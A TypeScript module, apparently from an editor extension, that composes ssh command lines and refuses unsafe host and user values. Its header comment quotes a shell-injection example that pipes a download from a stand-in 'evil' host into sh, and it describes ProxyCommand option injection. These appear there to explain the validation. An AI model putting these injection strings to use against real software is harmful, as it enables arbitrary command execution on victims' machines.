/**
 * Composing an `ssh` command line from an entity. Pure and free of `vscode` so that
 * everything built on top of it — the details block, the clipboard text — can be tested
 * without an editor. `openSshTerminal` stays in `terminalManager.ts`, which needs one.
 *
 * <p><b>`host` and `user` are untrusted.</b> An entity does not only come from the form
 * on this machine: sync merges whatever is in a shared vault location, and Accept Share
 * imports whatever a colleague sealed. The envelope's GCM tag authenticates the CONTAINER,
 * not the plausibility of a field inside it — so a writer of the shared folder, or anyone
 * who can get a share accepted, chooses these strings.</p>
 *
 * <p>That matters twice over, because there are two different parsers downstream and each
 * has its own injection:</p>
 * <ul>
 *   <li><b>A shell.</b> The composed line goes to `terminal.sendText(line, true)` — the
 *       `true` presses Enter. `sshKeyPath` was quoted here from the beginning;
 *       `user@host` never was, so <code>a.com; curl evil|sh</code> ran on Connect.</li>
 *   <li><b>ssh's own argv parser.</b> A host beginning with <code>-</code> is a FLAG, not a
 *       hostname, and <code>-oProxyCommand=…</code> makes ssh run a local command before it
 *       authenticates anything. Verified against OpenSSH 10.3: the command executed.</li>
 * </ul>
 *
 * <p>So both are refused at composition rather than escaped. Escaping answers the first
 * parser and not the second, and a value that cannot be a hostname has no legitimate use.</p>
 */

import { EntityMetadata } from './types';
import { sshOptionArgv } from './sshOptions';

export const DEFAULT_SSH_PORT = 22;

/** What the caller resolved from the vault: the jump chain, and a pinned host key file. */
export interface SshCommandOptions {
  /** The `-J` value, already resolved and validated by `resolveJumpChain`. */
  jump?: string;
  /** A materialized known_hosts file holding this host's pinned key. */
  knownHostsFile?: string;
}

/**
 * Hostnames, IPv4, and bracketed IPv6 — and never a leading `-`, which ssh reads as an
 * option rather than a destination.
 */
export function isSafeSshHost(host: string): boolean {
  return host.length > 0 && host.length <= 255 && !host.startsWith('-') && /^[A-Za-z0-9._:\[\]-]+$/.test(host);
}

/**
 * POSIX account names, plus the backslash a Windows domain account needs
 * (`CORP\\alice`). No whitespace, no metacharacter, no leading `-`.
 */
export function isSafeSshUser(user: string): boolean {
  return user.length > 0 && user.length <= 64 && !user.startsWith('-') && /^[A-Za-z0-9._\\$-]+$/.test(user);
}

/** Both halves of a destination, checked together. */
// eslint-disable-next-line complexity
export function isSafeSshTarget(entity: EntityMetadata): boolean {
  if (!entity.host || !isSafeSshHost(entity.host)) {
    return false;
  }
  return entity.user === undefined || entity.user.length === 0 || isSafeSshUser(entity.user);
}

/**
 * Quote a value for the integrated terminal's shell. On Windows shells
 * (PowerShell/cmd) backslashes are path separators, not escapes â€” only
 * embedded double quotes need care there. On POSIX shells escape the
 * characters that are special inside double quotes.
 */
function shellQuote(value: string, platform: NodeJS.Platform = process.platform): string {
  if (platform === 'win32') {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return `"${value.replace(/([\\"$`])/g, '\\$1')}"`;
}

/** `user@host:port` (port omitted when default) â€” the connection identity. */
// eslint-disable-next-line complexity
export function describeSshTarget(entity: EntityMetadata): string | undefined {
  if (!isSafeSshTarget(entity)) {
    // Refused here too, so no dialog, terminal title or clipboard text ever
    // displays a target the connect path would refuse to use.
    return undefined;
  }
  const base = entity.user ? `${entity.user}@${entity.host}` : entity.host;
  return entity.port !== undefined && entity.port !== DEFAULT_SSH_PORT
    ? `${base}:${entity.port}`
    : base;
}

/**
 * Build the ssh command line for an entity:
 * `ssh -i "<sshKeyPath>" -p <port> <user>@<host>`
 * `-i` is omitted when no key path is set, `-p` when the port is empty or 22.
 * Returns undefined when the entity has no host.
 */
// eslint-disable-next-line complexity
export function buildSshCommand(
  entity: EntityMetadata,
  platform: NodeJS.Platform = process.platform,
  options: SshCommandOptions = {},
): string | undefined {
  if (!isSafeSshTarget(entity)) {
    return undefined;
  }
  const host = entity.host as string; // isSafeSshTarget above proved it non-empty
  const parts: string[] = ['ssh'];
  if (entity.sshKeyPath) {
    parts.push('-i', shellQuote(entity.sshKeyPath, platform));
  }
  if (entity.port !== undefined && entity.port !== DEFAULT_SSH_PORT) {
    parts.push('-p', String(entity.port));
  }
  // The connection-manager options (jump host, forwards, agent forwarding) are composed by
  // `sshOptions.ts` — the SAME function the agent's argv builder calls, so the two surfaces
  // cannot reach a host by different routes. Every element is already refused-or-safe there,
  // which is why they are appended rather than quoted: quoting would be answering the wrong
  // parser, as this file's header explains.
  parts.push(...sshOptionArgv(entity, options.jump));
  parts.push(...hostKeyArgv(options.knownHostsFile, platform));
  parts.push(entity.user ? `${entity.user}@${host}` : host);
  return parts.join(' ');
}

/**
 * How the host key is checked, and it is the point of audit item B10.
 *
 * <p>With a pin, a known_hosts file holding exactly that key and `StrictHostKeyChecking=yes`: a
 * changed key then FAILS the connection. Without one, `accept-new` as before — but the caller is
 * expected to have shown the fingerprint first, which is the half that was missing.</p>
 */
function hostKeyArgv(knownHostsFile: string | undefined, platform: NodeJS.Platform): string[] {
  if (knownHostsFile === undefined) {
    // NOTHING, deliberately — and this is the difference between the two paths. A human
    // terminal has a person in front of it, so ssh's own default (`ask`) prompts and they
    // answer; forcing `accept-new` here would take that question away, which is the silence
    // B10 is about. The agent's exec has nobody to ask and keeps `accept-new`; the password
    // branch in `sshConnect.ts` also forces it, because with SSH_ASKPASS_REQUIRE=force the
    // host-key question would otherwise be answered by the askpass program — with the password.
    return [];
  }
  return [
    '-o',
    'StrictHostKeyChecking=yes',
    '-o',
    `UserKnownHostsFile=${shellQuote(knownHostsFile, platform)}`,
  ];
}

/**
 * Open (or reuse) the terminal for this entity's full connection identity
 * (`SSH: user@host:port`, so two accounts on one host don't collide) and
 * run the ssh command. An existing live terminal is revealed as-is â€” it
 * most likely already holds a session; re-sending `ssh` into it would
 * type into the remote shell.
 */
